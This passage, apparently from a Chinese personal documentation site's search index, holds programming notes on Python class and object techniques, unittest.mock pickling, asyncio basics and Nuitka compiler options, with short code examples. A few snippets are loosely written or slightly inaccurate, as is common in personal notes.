__slots__ 特性。 通过定义一个描述器，你可以在底层捕获核心的实例操作 (get, set, delete)，并且\n可完全自定义它们的行为。这是一个强大的工具，有了它你可以实现很多高级功能，并\n且它也是很多高级库和框架中的重要工具之一。 描述器的一个比较困惑的地方是它只能在类级别被定义，而不能为每个实例单独\n定义。因此，下面的代码是无法工作的: # Does NOT work\nclass Point:\n  def __init__(self, x, y):\n    self.x = Integer('x') # No! Must be a class variable\n    self.y = Integer('y')\n    self.x = x\n    self.y = y __get__() 看上去有点复杂的原因归结于实例变量和类变量的不同。如果一个描述\n器被当做一个类变量来访问，那么 instance 参数被设置成 None 。这种情况下，标准做\n法就是简单的返回这个描述器本身即可 (尽管你还可以添加其他的自定义操作): >>> p = Point(2,3)\n>>> p.x # Calls Point.x.__get__(p, Point)\n2\n>>> Point.x # Calls Point.x.__get__(None, Point)\n<__main__.Integer object at 0x100671890>\n>>> 使用延迟计算属性 将一个只读属性定义成一个 property，并且只在访问的时候才会计算结果。但\n是一旦被访问后，你希望结果值被缓存起来，不用每次都去计算。 一般自己实现都是使用的预定义类变量的形式. 也可以使用类装饰器的形式实现: class lazyproperty:\n  def __init__(self, func):\n    self.func = func\n\ndef __get__(self, instance, cls):\n  if instance is None:\n    return self\n  else:\n    value = self.func(instance)\n    # 主要是这一句设置值\n    setattr(instance, self.func.__name__, value)\n    return value 使用: import math\nclass Circle:\n\n  def __init__(self, radius):\n    self.radius = radius\n\n  @lazyproperty\n  def area(self):\n    print('Computing area')\n    return math.pi * self.radius ** 2\n\n  @lazyproperty\n  def perimeter(self):\n    print('Computing perimeter')\n    return 2 * math.pi * self.radius 交互环境中演示: >>> c = Circle(4.0)\n>>> c.radius\n4.0\n>>> c.area\nComputing area\n50.26548245743669\n>>> c.area\n50.26548245743669\n>>> c.perimeter\nComputing perimeter\n25.132741228718345\n>>> c.perimeter\n25.132741228718345\n>>> 当一个描述器被放入一个类的定义时，\n每次访问属性时它的 __get__() 、__set__() 和 __delete__() 方法就会被触发。不过，\n如果一个描述器仅仅只定义了一个 __get__() 方法的话，它比通常的具有更弱的绑定。\n特别地， 只有当被访问属性不在实例底层的字典中时 __get__() 方法才会被触发。 简化数据结构的初始化 你写了很多仅仅用作数据结构的类，不想写太多烦人的 __init__() 函数 可以在一个基类中写一个公用的 __init__() 函数, 然后使你的类继承自这个基类. 注意设置值可以使用 setattr或__dict__ [setattr(self, name, name) for name in args]\n\nself.__dict__.update(zip(args)) 使用dict时, 尽管也可以正常工作，但是当定义子类的时候问题就来了。当一个子类定义了\n__slots__ 或者通过 property(或描述器) 来包装某个属性，那么直接访问实例字典就\n不起作用了。 这种方法唯一不好的地方就是对某些 IDE 而言，在显示帮助函数时可能不太友好。 定义接口或者抽象基类 想定义一个接口或抽象类，\n并且通过执行类型检查来确保子类实现了某些特定的方法 使用 abc 模块可以很轻松的定义抽象基类: from abc import ABCMeta, abstractmethod\nclass IStream(metaclass=ABCMeta):\n\n  @abstractmethod\n  def read(self, maxbytes=-1):\n    pass\n\n  @abstractmethod\n  def write(self, data):\n    pass 抽象类的一个特点是它不能直接被实例化，比如你想像下面这样做是不行的: a = IStream()\n\n# TypeError: Can't instantiate abstract class\n# IStream with abstract methods read, write 抽象类的目的就是让别的类继承它并实现特定的抽象方法 class SocketStream(IStream):\n\n  def read(self, maxbytes=-1):\n    pass\n\n  def write(self, data):\n    pass 抽象基类的一个主要用途是在代码中检查某些类是否为特定类型，实现了特定接口: def serialize(obj, stream):\n  if not isinstance(stream, IStream):\n    raise TypeError('Expected an IStream')\n  pass 除了继承这种方式外，还可以通过注册方式来让某个类实现抽象基类: import io\n# Register the built-in I/O classes as supporting our interface\nIStream.register(io.IOBase)\n# Open a normal file and type check\nf = open('foo.txt')\nisinstance(f, IStream) # Returns True @abstractmethod 还能注解静态方法、类方法和 properties 。你只需保证这个注解紧靠在函数定义前即可: class A(metaclass=ABCMeta):\n\n  @property\n  @abstractmethod\n  def name(self):\n    pass\n\n  @name.setter\n  @abstractmethod\n  def name(self, value):\n    pass\n\n  @classmethod\n  @abstractmethod\n  def method1(cls):\n    pass\n\n  @staticmethod\n  @abstractmethod\n  def method2():\n    pass 标准库中有很多用到抽象基类的地方。collections 模块定义了很多跟容器和迭\n代器 (序列、映射、集合等) 有关的抽象基类。numbers 库定义了跟数字对象 (整数、浮\n点数、有理数等) 有关的基类。io 库定义了很多跟 I/O 操作相关的基类。 可以使用预定义的抽象类来执行更通用的类型检查: import collections\n# Check if x is a sequence\nif isinstance(x, collections.Sequence):\n  ...\n\n# Check if x is iterable\nif isinstance(x, collections.Iterable):\n  ...\n\n# Check if x has a size\nif isinstance(x, collections.Sized):\n  ...\n\n# Check if x is a mapping\nif isinstance(x, collections.Mapping):\n  ... 尽管 ABCs 可以让我们很方便的做类型检查，但是我们在代码中最好不要过多的\n使用它。因为 Python 的本质是一门动态编程语言，其目的就是给你更多灵活性，强制\n类型检查或让你代码变得更复杂，这样做无异于舍本求末。 实现数据模型的类型约束 定义某些在属性赋值上面有限制的数据结构。 实现自定义容器 想实现一个自定义的类来模拟内置的容器类功能，比如列表和字典。但是你不确\n定到底要实现哪些方法 collections 定义了很多抽象基类，当你想自定义容器类的时候它们会非常有用。\n比如你想让你的类支持迭代，那就让你的类继承 collections.Iterable. 不过你需要实现 collections.Iterable 所有的抽象方法，否则会报错. 使用 collections 中的抽象基类可以确保你自定义的容器实现了所有必要的方法。\n并且还能简化类型检查。 属性的代理访问 想将某个实例的属性访问代理到内部另一个实例中去，目的可能是作为继承的\n一个替代方法或者实现代理模式。 简单来说，代理是一种编程模式，它将某个操作转移给另外一个对象来实现。最简\n单的形式可能是像下面这样: class A:\n  def spam(self, x):\n    pass\n\n  def foo(self):\n    pass\n\nclass B1:\n  \"\"\" 简单的代理\"\"\"\n  def __init__(self):\n    self._a = A()\n\n  def spam(self, x):\n    # Delegate to the internal self._a instance\n    return self._a.spam(x)\n\n  def foo(self):\n    # Delegate to the internal self._a instance\n    return self._a.foo()\n\n  def bar(self):\n    pass 如果仅仅就两个方法需要代理，那么像这样写就足够了。但是，如果有大量的方法\n需要代理，那么使用 __getattr__() 方法或许或更好些: def __getattr__(self, name):\n  \"\"\" 这个方法在访问的 attribute 不存在的时候被调用\n  the __getattr__() method is actually a fallback method\n  that only gets called when an attribute is not found\"\"\"\n  return getattr(self._a, name) __getattr__ 方法是在访问 attribute 不存在的时候被调用 当实现代理模式时，还有些细节需要注意。首先，__getattr__() 实际是一个后备\n方法，只有在属性不存在时才会调用。因此，如果代理类实例本身有这个属性的话，那\n么不会触发这个方法的。另外，__setattr__() 和 __delattr__() 需要额外的魔法来\n区分代理实例和被代理实例 _obj 的属性。一个通常的约定是只代理那些不以下划线 _\n开头的属性 (代理类只暴露被代理类的公共属性)。 还有一点需要注意的是，__getattr__() 对于大部分以双下划线 (__) 开始和结尾\n的属性并不适用 在类中定义多个构造器 想实现一个类，除了使用 __init__() 方法外，还有其他方式可以初始化它 为了实现多个构造器，你需要使用到类方法: import time\nclass Date:\n  \"\"\" 方法一：使用类方法\"\"\"\n  # Primary constructor\n  def __init__(self, year, month, day):\n    self.year = year\n    self.month = month\n    self.day = day\n\n  # Alternate constructor\n  @classmethod\n  def today(cls):\n    t = time.localtime()\n    return cls(t.tm_year, t.tm_mon, t.tm_mday) 直接调用类方法即可: a = Date(2012, 12, 21) # Primary\nb = Date.today() # Alternate 创建不调用 init 方法的实例 想创建一个实例，但是希望绕过执行 __init__() 方法 可以通过 __new__() 方法创建一个未初始化的实例.\n不调用 __init__() 方法来创建一个实例, 使用 setattr 设置值: >>> d = Date.__new__(Date)\n>>> d\n<__main__.Date object at 0x1006716d0>\n>>> d.year\n\n>>> setattr(d, 'year', 2023) 利用 Mixins 扩展类功能 有很多有用的方法，想使用它们来扩展其他类的功能。但是这些类并没有任何继\n承的关系。因此你不能简单的将这些方法放入一个基类，然后被其他类继承。 定义使用了__slots__=(), 表示实例字典不存储信息: class SetOnceMappingMixin:\n  '''\n  Only allow a key to be set once.\n  '''\n  __slots__ = ()\n\n  def __setitem__(self, key, value):\n    if key in self:\n      raise KeyError(str(key) + ' already set')\n    return super().__setitem__(key, value) 通常当你想自定义类的时候会碰上这些问题。可能是某个库提供了一些基础类，你\n可以利用它们来构造你自己的类。\n假设你想扩展映射对象，给它们添加日志、唯一性设置、类型检查等等功能。 实现状态对象或者状态机 想实现一个状态机或者是在不同状态下执行操作的对象，但是又不想在代码中\n出现太多的条件判断语句。 一个更好的办法是为每个状态定义一个对象: class Connection1:\n  \"\"\" 新方案——对每个状态定义一个类\"\"\"\n  def __init__(self):\n    self.new_state(ClosedConnectionState)\n\n  def new_state(self, newstate):\n    self._state = newstate\n\n  # Delegate to the state class\n  def read(self):\n    return self._state.read(self)\n\n  def write(self, data):\n    return self._state.write(self, data) 如果代码中出现太多的条件判断语句的话，代码就会变得难以维护和阅读。这里的\n解决方案是将每个状态抽取出来定义成一个类。 这里看上去有点奇怪，每个状态对象都只有静态方法，并没有存储任何的实例\n属性数据。实际上，所有状态信息都只存储在 Connection 实例中。在基类中定义的\nNotImplementedError 是为了确保子类实现了相应的方法。 ps: 设计模式中有一种模式叫状态模式, 与此类似. 通过字符串调用对象方法 有一个字符串形式的方法名称，想通过它调用某个对象的对应方法。 最简单的情况，可以使用 getattr() 另外一种方法是使用 operator.methodcaller() 当你需要通过相同的参数多次调用某个方法时，使用 operator.methodcaller 就\n很方便了。比如你需要排序一系列的点，就可以这样做: points = [\n  Point(1, 2),\n  Point(3, 0),\n  Point(10, -3),\n  Point(-5, -7),\n  Point(-1, 8),\n  Point(3, 2) ]\n\n# Sort by distance from origin (0, 0)\npoints.sort(key=operator.methodcaller('distance', 0, 0)) 调用一个方法实际上是两部独立操作，第一步是查找属性，第二步是函数调用。因\n此，为了调用某个方法，你可以首先通过 getattr() 来查找到这个属性，然后再去以\n函数方式调用它即可。 operator.methodcaller() 创建一个可调用对象，并同时提供所有必要参数，然\n后调用的时候只需要将实例对象传递给它即可 实现访问者模式 你要处理由大量不同类型的对象组成的复杂数据结构，每一个对象都需要需要进\n行不同的处理。比如，遍历一个树形结构，然后根据每个节点的相应状态执行不同的操\n作。 这里遇到的问题在编程领域中是很普遍的，有时候会构建一个由大量不同对象组\n成的数据结构。 使用访问者模式: class NodeVisitor:\n  def visit(self, node):\n    methname = 'visit_' + type(node).__name__\n    meth = getattr(self, methname, None)\n    if meth is None:\n      meth = self.gen\n    return meth(node)\n\nclass Evaluator(NodeVisitor):\n  def visit_Number(self, node):\n    return node.value\n\n  def visit_Add(self, node):\n    return self.visit(node.left) + self.visit(node.right)\n\n  def visit_Sub(self, node):\n    return self.visit(node.left) - self.visit(node.right)\n\n  def visit_Mul(self, node):\n    return self.visit(node.left) * self.visit(node.right)\n\n  def visit_Div(self, node):\n    return self.visit(node.left) / self.visit(node.right)\n\n  def visit_Negate(self, node):\n    return -node.operand 刚开始的时候你可能会写大量的 if/else 语句来实现，这里访问者模式的好处就是\n通过 getattr() 来获取相应的方法 还有一点需要指出的是，这种技术也是实现其他语言中 switch 或 case 语句的方式。\n比如，如果你正在写一个 HTTP 框架，你可能会写这样一个请求分发的控制器: class HTTPHandler:\n  def handle(self, request):\n    methname = 'do_' + request.request_method\n    getattr(self, methname)(request)\n\n  def do_GET(self, request):\n    pass\n\n  def do_POST(self, request):\n    pass\n\n  def do_HEAD(self, request):\n    pass 不用递归实现访问者模式 访问者模式一个缺点就是它严重依赖递归，如果数据结构嵌套层次太深可能会有\n问题，有时候会超过 Python 的递归深度限制 (参考 sys.getrecursionlimit() )。 你使用访问者模式遍历一个很深的嵌套树形数据结构，并且因为超过嵌套层级限\n制而失败。你想消除递归，并同时保持访问者编程模式。 通过巧妙的使用生成器可以在树遍历或搜索算法中消除递归。 循环引用数据结构的内存管理 程序创建了很多循环引用数据结构 (比如树、图、观察者模式等)，你碰到了内存管理难题。 一个简单的循环引用数据结构例子就是一个树形结构，双亲节点有指针指向孩子\n节点，孩子节点又返回来指向双亲节点。这种情况下，可以考虑使用 weakref 库中的\n弱引用: import weakref\n\nclass Node:\n\n  def __init__(self, value):\n    self.value = value\n    self._parent = None\n    self.children = []\n\n  def __repr__(self):\n    return 'Node({!r:})'.format(self.value)\n\n  # property that manages the parent as a weak-reference\n  @property\n  def parent(self):\n    return None if self._parent is None else self._parent()\n\n  @parent.setter\n  def parent(self, node):\n    self._parent = weakref.ref(node)\n\n  def add_child(self, child):\n    self.children.append(child)\n    child.parent = self 这种是想方式允许 parent 静默终止。例如: >>> root = Node('parent')\n>>> c1 = Node('child')\n>>> root.add_child(c1)\n>>> print(c1.parent)\nNode('parent')\n>>> del root\n>>> print(c1.parent)\nNone\n>>> 循环引用的数据结构在 Python 中是一个很棘手的问题，因为正常的垃圾回收机制\n不能适用于这种情形。 Python 有另外的垃圾回收器来专门针对循环引用的，但是你永远不知道它什么时\n候会触发。另外你还可以手动的触发它，但是代码看上去很挫: >>> import gc\n>>> gc.collect() # Force collection\nData.__del__\nData.__del__\n>>> 如果循环引用的对象自己还定义了自己的 __del__() 方法，那么会让情况变得更\n糟糕。 弱引用消除了引用循环的这个问题，本质来讲，弱引用就是一个对象指针，它不会\n增加它的引用计数。你可以通过 weakref 来创建弱引用 让类支持比较操作 想让某个类的实例支持标准的比较运算 (比如 >=,!=,<=,< 等)，但是又不想去\n实现那一大丢的特殊方法。 Python 类对每个比较操作都需要实现一个特殊方法来支持。例如为了支持 >= 操\n作符，你需要定义一个 __ge__() 方法。尽管定义一个方法没什么问题，但如果要你实\n现所有可能的比较方法那就有点烦人了。 装饰器 functools.total_ordering 就是用来简化这个处理的。使用它来装饰一个\n来，你只需定义一个 __eq__() 方法，外加其他方法 (__lt__, __le__, __gt__, or\n__ge__) 中的一个即可。然后装饰器会自动为你填充其它比较方法。 创建缓存实例 在创建一个类的对象时，如果之前使用同样参数创建过这个对象，你想返回它的缓\n存引用 要使用一个和类本身分开的工厂函数 虑重新定义类的 __new__() 方法, 不过有个问题是 __init__() 每次都会被调用，不管这个实例是否被缓存了\n(一个解决办法是, 仅使用__new__来实例)","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Class-and-object.html","loc":"/yq-docs-rear-end-python-cookbook-Class-and-object.html"},{"title":"unittest","text":"mock 官网文档:: unittest.mock-上手指南 模拟方法调用, 比如测试的时候, 只想测试某一个类, 但是类有相关联的其他类, 那么可以使用 Mock() 来代替其他类. 记录一些坑 Can't pickle <class 'mock.Mock'> 报错: pickle.PicklingError: Can't pickle <class 'mock.Mock'>: it's not the same object as mock.Mock 类似这种 pickle 序列化报错, 大部分是在 多进程 下进行测试而出现的序列化问题 但是这里是 Mock 本身的问题, 使用以下方式解决: class PickableMock(Mock):\n  def __reduce__(self):\n      return (Mock, ()) 可参考解决地址:: Can't pickle MagicMock or Mock #139","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-Unittest.html","loc":"/yq-docs-rear-end-python-python-standard-library-Unittest.html"},{"title":"asyncio","text":"官网: https://docs.python.org/zh-cn/3/library/asyncio.html 低层api索引: https://docs.python.org/zh-cn/3/library/asyncio-llapi-index.html 这部分属于协程, 相关介绍可见: 协程 包问题 如果尝试用pip安装过, 会发现asyncio目前同时存在于Python标准库和三方包中, 这是因为: Python 3.4引入了asyncio模块,这是asyncio最初出现在Python标准库的形式。 在Python 3.5中,asyncio模块被重构,并更名为asyncio package。这是目前Python标准库中推荐使用的asyncio形式。 此外,还存在三方包asyncio和trolly,它们在Python 3.3之前实现了asyncio功能。 所以,目前asyncio主要有这三种形式: Python 3.4中的asyncio模块(已过时) Python 3.5+中的asyncio package(推荐) 三方包asyncio和trolly(仅用于Python 3.3之前) 应该关注并使用的是Python 3.5+中的asyncio package。它是官方支持和推荐的asyncio形式,具有更丰富的功能和更高的性能。\n三方包asyncio和trolly由于兼容性问题,已经很少再被使用。而asyncio模块由于设计问题,已在Python 3.5中被更名和重构。 await和create_task的区别 await: 当前代码在此处挂起(阻塞), 等待await的语句执行完成. 程序中时间循环中的其他语句可以在这时候执行.\n直到await的语句执行完成(如果一下就执行完了, 那么可以说没有等待) 但只能用在 async 方法体内 create_task: 创建一个任务, 提交给事件循环队列(上下文环境复制一份给事件循环), 事件循环自动调度, 不阻塞 同步异步方法内皆可用 可等待对象 可等待对象有 coroutine/future/task 其中task是future的子类 任务回调 task.add_done_callback 完成后的回调如何自定义参数, 使用 functools.partial 偏函数来插入参数，\n此处正常情况的参数只有一个 future 对象表示它本身这个 task: # 插入参数后， 实际回调的参数列表为 (_num, task), 也就是 (10, task)\ntask.add_done_callback(functools.partial(cls._set_num1, 10)) 多线程的事件循环 一般而言, 只能是主线程拥有自己的事件循环, 子线程无法获取主线程的loop, 若子线程需要, 可以在新建一个loop给子线程使用, 尤其是gui编程的时候, 一般gui线程只能在主线程跑(除非提供了特殊支持),\n那么当存在全局的非gui能处理的实时监听时, 那么就只能在子线程跑了(或者新建一个进程, 至少目前我是没有其他办法) 事件循环增加信号监听 code: import signal\nloop.add_signal_handler(signal.SIGTERM, hander) 与socket协作 code: _sock: socket.socket\nloop.sock_recv(_sock, 1024) 并发执行(假并发) 使用 asyncio.gather 同时运行两个协程任务: tasks = [task1(), task2()]\nloop.run_until_complete(asyncio.gather(*tasks)) 创建socket-udp事件 使用 loop.create_datagram_endpoint loop.create_datagram_endpoint(protocol_factory, local_addr=None, remote_addr=None, *, family=0, proto=0, flags=0, reuse_port=None, allow_broadcast=None, sock=None) 创建一个数据报连接。 套接字族可以是 AF_INET, AF_INET6 或 AF_UNIX，具体取决于 host (或 family 参数，如果有提供的话)。 socket类型将是 SOCK_DGRAM 。 protocol_factory: 必须为一个返回 协议 实现的可调用对象。 成功时返回一个 (transport, protocol) 元组。 local_addr: 如果指定，它应当是一个用来在本地绑定套接字的 (local_host, local_port) 元组。\nlocal_host 和 local_port 是使用 getaddrinfo() 来查找的。 remote_addr: 如果指定的话，就是一个 (remote_host, remote_port) 元组，\n用于同一个远程地址连接。remote_host 和 remote_port 是使用 getaddrinfo() 来查找的。 family, proto, flags 是可选的地址族，协议和标志，其会被传递给 getaddrinfo() 来完成 host 的解析。\n如果要指定的话，这些都应该是来自于 socket 模块的对应常量。 reuse_port: 告知内核，只要在创建时都设置了这个旗标，就允许此端点绑定到其他现有端点所绑定的相同端口上。\n这个选项在 Windows 和某些 Unix 上不受支持。 如果 SO_REUSEPORT 常量未定义则此功能就是不受支持的。 allow_broadcast: 告知内核允许此端点向广播地址发送消息。 sock: 可选择通过指定此值用于使用一个预先存在的，已经处于连接状态的 socket.socket 对象，\n并将其提供给此传输对象使用。如果指定了这个值， local_addr 和 remote_addr 就应该被忽略 (必须为 None)。 当具有不同 UID 的多个进程将套接字赋给具有 SO_REUSEADDR 的相同 UDP 套接字地址时，传入的数据包可能会在套接字间随机分配。 对于受支持的平台，reuse_port 可以被用作类似功能的替代。 通过 reuse_port 将改用 SO_REUSEPORT，\n它能够防止具有不同 UID 的进程将套接字赋给相同的套接字地址。 eg: loop.create_datagram_endpoint(\n            lambda: OrdinaryProtocol(),\n            local_addr=('0.0.0.0', 0),\n        ) 注意 protocol_factory 必须为一个返回 协议 实现的可调用对象,\n协议 实现是指实现 asyncio.protocols 下的需要的协议, 协议的基类是 asyncio.protocols.BaseProtocol\n如udp编程使用 协议 实现asyncio.protocols.DatagramProtocol\n这里是 OrdinaryProtocol() 就是实现的 DatagramProtocol: class DatagramProtocol(DatagramProtocol):\n    def __init__(self):\n        self._transport: Optional[DatagramTransport] = None\n        self._udp_socket: Optional[DatagramTransport] = None\n\n    def connection_made(self, transport: transports.DatagramTransport) -> None:\n        self._transport = transport\n\n    def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None:\n        _LOGGER.debug(f'datagram_received:: addr: {addr} ; data: {data}')\n\n    def connection_lost(self, exc: Optional[Exception]) -> None:\n        ...\n\n    async def close(self):\n        self._transport.close() 判断是否是协程 可使用 asyncio 的 iscoroutinefunction: async def async_func(): ...\nasyncio.iscoroutinefunction(async_func)     # True 或者inspect 的检查: inspect.iscoroutinefunction(async_func))    # True 如果要使用类型注解, 参见 CR_Callable","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-asyncio.html","loc":"/yq-docs-rear-end-python-python-standard-library-asyncio.html"},{"title":"nuitka","text":"nuitka中文官网: https://nuitka.net/zh_CN/index.html Nuitka 是一个将 Python 代码编译成 C 或 C++ 代码的工具.\n可以享受到python级别的开发速度，c级别的运行速度 Mac 下安装: pip install nuitka 额外建议安装orderedset， 这个是使用的时候建议安装, 原因:\nNuitka:WARNING: Using very slow fallback for ordered sets,\nplease install 'orderedset' PyPI package\nfor best Python compile time performance: pip install orderedset 简单使用 当前系统版本安装的是python3版本的，所以于之前直接用 nuitka运行不一致，现在是nuitka3.\n最简单的编译一个python文件: nuitka3 xxx.py Win使用的时候会提示安装 ccache来加速，根据提示输入安装就是了，\n我的是在 ' https://nuitka.net/ccache/v4.2.1/ccache-4.2.1.zip ' 自动下载安装\n执行成功后会在当前目录下生成相应的可执行文件和编译文件夹，xxx.bin（win下是exe文件）跟xxx.build， 命令选项 如: nuitka --standalone --show-progress --show-memory --plugin-enable=tk-inter --include-data-dir=resource=resource  --onefile trigger-angle.py\npython -m nuitka --standalone --show-progress --show-memory --plugin-enable=pyqt5 --windows-icon-from-ico=res/icon.ico  --include-data-dir=jsons=jsons --include-data-dir=pyqt=pyqt --include-data-dir=res=res --windows-disable-console --onefile  .\\main_pyqt.py 常用 --module= <file> 指定主文件(入口文件), 比如main.py --standalone , -s 生成独立的可执行文件(包含所有依赖项, 使目标机器不需要自己安装Python即可运行) --onefile 是否打包为一个单独的 exe 文件(像pyinstaller一样)， 默认生成位置是在项目根目录下 --output-dir= <dir> , -o <dir> 输出目录, 生成exe到 dir文件夹 下面去 --plugin-enable= <plugin> 手动指定需要编译的三方包模块,\n比如一些GUI模块tkinter, numpy, pytorch\n如: --plugin-enable=tk-inter --include-files 指定文件包含到编译输出 --include-data-file= <source=target> 包含的文件夹, 会直接复制过去\nsource代表当前(编译前的源代码阶段)位置;\ntarget代码编译后放置的位置,\n注意 = 不能甚省略. --show-memory 查看编译时内存占用 --show-progress 查看编译进度, 显示进度条 --remove-output , -x 删除编译后的文件. --python-flag= <FLAG> , -k <FLAG> 使用指定 Python 解释器编译. --show-scons 显示 Scons 命令及其参数，方便调试. --recurse-all , -r 递归处理所有导入过的模块 --show-modules , -m 显示要编译的所有模块 --experimental-annotations , -e a 启用实验性的类型注释功能. 即是否将Python代码中已有的\n类型注解转换为C(++)的强类型定义. --no-pyi-file , -n p 不生成.pyi文件 --lto= <[yes,no]> 是否启用链接时优化（Link Time Optimization，LTO）.\n它的作用是在链接可执行文件时，对整个程序进行全局优化，以达到更好的性能。\n会增加额外的编译时间消耗.\n启用后(yes)，nuitka 会在编译过程中生成 LLVM bitcode 文件，然后使用 LLVM 工具链进行链接。\nLLVM 提供了一种跨平台的链接时优化技术，可以对各个模块之间的函数调用关系和数据依赖关系进行分析，\n从而进行更加有效的优化。 --debug 启用编译后的可执行文件的运行时调试支持(也就是调试相关的符号表, 没有的话没法gdb调试) --python-debug 用于生成可以进行调试的编译后的二进制文件（或者.so/.dll库文件）。\n它会保留源代码中的所有调试信息，包括行号、变量名称等\n.. 可以在 Python 调试器中进行调试, 好像只能设置远程调试服务器, 待测试 包含/导入模块/包 --include-package= PACKAGE 显示指定需要包含的整个包. 默认为空.\n复制比如numpy,PyQt5 这些带子文件夹的包\ne.g. \"some_package.sub_package\". Python 将会寻找并包含到编译输出.\n为了避免导入不需要的包, 可以使用, 如 \"--nofollow-import-to=*.tests\". --include-module= MODULE 包括单个模块。以一个Python命名空间给出，\n复制比如when.py 这种以.py结尾的模块.\n例如\"Some_Package.Some_Module\"，然后Nuitka将\n找到它并将其包含在二进制或扩展中\n模块，并使其可通过以下方式导入\n密码。默认为空。 --include-plugin-directory= <MODULE/PACKAGE> 另外包含指定路径的下的包/模块.\n此处找到的将会覆盖原来有的. 可指定多次.\n默认为空. --include-plugin-files= PATTERN 包含文件内能匹配 PATTERN 的. 会覆盖原有的 .\n可指定多次.\n默认为空. --prefer-source-code 对于已经编译好的拓展模块, 不论是源文件还是拓展模块, 都正常使用.\n会比直接从可用源文件编译要好?(这里没懂).\n如果不希望，有--noprefer-source-code 来禁用有关它的警告。\n默认 off. 控制跟踪导入的模块 什么叫跟踪导入? 见: CR_Python_跟踪导入 --follow-stdlib= <{yes,no}> 是否包含整个 Python 标准库, 会增加很多时间.\n默认关闭. 值为 yes/no. --nofollow-imports 仅编译源代码，而不会尝试跟踪导入的任何模块/包.\n使用此选项时, 若代码依赖于其他库或模块，则必须手动将它们包含在编译后的二进制文件中。\n通常情况下，只有在确定所有依赖项都已正确安装并且您不需要将代码打包到独立的可执行文件中时，\n才应使用此选项。\n默认关闭. --follow-imports , -f 跟踪所有导入的模块/包，并将它们也编译为二进制文件.\n若程序依赖于其他库或模块，则必须使用此选项以确保所有依赖项都被正确地编译到生成的可执行文件中。\n这个选项可以确保你的程序能够完全独立运行，而不需要依赖于任何外部库或环境。\n默认关闭. --follow-import-to= <MODULE/PACKAGE> 指定搜索模块时的搜索路径, 从当前路径开始,\n详见: follow-import-to 可多次指定, 默认为空. --nofollow-import-to= <MODULE/PACKAGE> 不从路径导入.\n可指定多个, 默认为空. 数据文件 这里的数据文件通常是指 必要的资源文件 , 如图片, 配置文件. --include-package-data= PACKAGE 包含指定 PACKAGE 下的所有数据文件. 支持通配符\nBy default Nuitka does not\nunless hard coded and vital for operation of a package.\n文件应该是非 dll 文件, 非 拓展模块.\n默认为空. --include-data-files= <DESC> 包含分布下指定描述的所有数据文件,\n存在许多运行的格式, eg: --include-data-files=/path/to/file/*.txt=folder_name/some.txt ,\n将会复制为单个文件, 多文件将会有警告. --include-data-files=/path/to/files/*.txt=folder_name/ ,\n将会将所有匹配的文件复制到 folder_name 文件夹下.\n若需要递归拷贝, 使用 --include-data-files=/path/to/scan=folder_name=**/*.txt 同时还会保留原有目录结构.\n默认空. --include-data-dir= DIRECTORY 包含指定目录下的所有文件. 这是递归的.\n若不需递归, 使用 --include-data-files.\neg: '--include-data-dir=/path/some_dir=data/some_dir'\n将会拷贝一个普通的全文件副本.\n如果需要排除某些文件, 使用 --noinclude-data-files.\n默认为空. --noinclude-data-files= PATTERN 不包含符合 PATTERN 匹配的文件.\n仅针对文件名而非源路径.\neg: package_name` 会匹配 package_name/*.txt .\n默认空. DLL 文件 --noinclude-dlls= PATTERN 不包含复合匹配的 dll 文件.\n需指定到具体目标文件, eg:\n\"package_name/someDLL.*\"\n匹配 package_name 下包含 someDLL 的文件.\n默认为空. 其他 举例: --noinclude-pytest-mode= error 如果包含pytest模块报错 --noinclude-unittest-mode= error 如果包含unittest模块报错, 防止意外导入不需要的包. --enable-plugin= <module> 直接添加你要的插件支持,\n如--enable-plugin=pyqt5,numpy,matplotlib --plugin-list 不清楚该模块是否有特定的插件支持，在cmd窗口输入后查询 --mingw64 默认为已经安装的vs2017去编译，\n否则就按指定的比如mingw(官方建议),\n仅Win适用, 貌似 --windows-disable-console , -w dc 禁用Windows上的命令行窗口, 没有CMD控制窗口 --windows-icon-from-ico= <ico_p> 软件的图标, .ico图标文件 --windows-company-name= <com> Windows下软件公司name --windows-product-name= <product> Windows下软件名称 --windows-file-version= <file> Windows下软件的信息 --windows-product-version= <ver> 版本信息 --windows-file-description= <desc> Windows下软件的作用描述 --windows-uac-admin Windows下用户可以使用管理员权限来安装 --linux-onefile-icon= <file> Linux下的图标位置 YAML配置形式 支持使用 YAML 配置文件通过 --user-package-configuration-file 来指定配置,\n如以下配置: # sample configuration file for Nuitka\n\n# 输出路径\noutput_dir: ./dist/\n\n# 递归处理所有模块\nrecurse_all: true\n\n# 删除上一次的输出\nremove_output: true\n\n# 生成独立的文件\nstandalone: true\n\n# 显示进度条\nshow_progress: true\n\n# 跟踪导入\nfollow_imports: true\n\n# python 版本\npython_version: 3.9 启动: nuitka --config-file=config.yml myscript.py 注意，配置文件中的选项会覆盖命令行选项 关于 --nofollow-imports 说明 --nofollow-imports 是 Nuitka 编译器的一个选项，它的含义是在编译过程中不对某些导入语句进行处理。\n具体来说，如果使用了 --nofollow-imports 选项，则 Nuitka 编译器会忽略某些导入语句，\n并将它们视为运行时动态导入（Runtime Dynamic Imports），而不是静态导入。 通常情况下，Python 中的导入语句是静态的，也就是说，在执行 Python 脚本之前，所有必要的模块都已经被导入并加载到内存中了。\n然而，在某些情况下，我们可能需要根据运行时条件来动态导入某些模块，这就需要使用运行时动态导入。 使用 --nofollow-imports 选项可以让 Nuitka 编译器在编译过程中忽略某些导入语句，从而减少编译时间和输出文件大小。\n但是，这也可能会导致某些代码无法正常编译或运行，因此建议在使用该选项时谨慎考虑。 例如，假设我们有一个 Python 脚本 main.py，其中包含以下导入语句: import module1\nfrom module2 import func\n\nif some_condition:\n    import module3\nelse:\n    import module4 如果使用默认选项（即不添加 --nofollow-imports），\n则 Nuitka 编译器会尝试静态地分析这些导入语句，并在编译过程中将所有必要的模块都包含在输出文件中。\n如果使用 --nofollow-imports 选项，则 Nuitka 编译器会忽略其中一些导入语句，例如： nuitka --nofollow-imports main.py 由于该脚本中存在运行时条件导入语句，因此 Nuitka 编译器只能将它们视为运行时动态导入，而不是静态导入。 关于 --follow-import-to 说明 指示编译器在遵循 import 语句时应该搜索哪些路径。 这个标志允许你指定要跟踪的目录或文件名，使得 Nuitka 在编译过程中可以找到需要的依赖项。 例如，如果使用: --follow-import-to=dir1:dir2 则 Nuitka 将首先搜索当前目录、然后再搜索 dir1 和 dir2 目录，以查找所需的模块。 follow_imports 说明 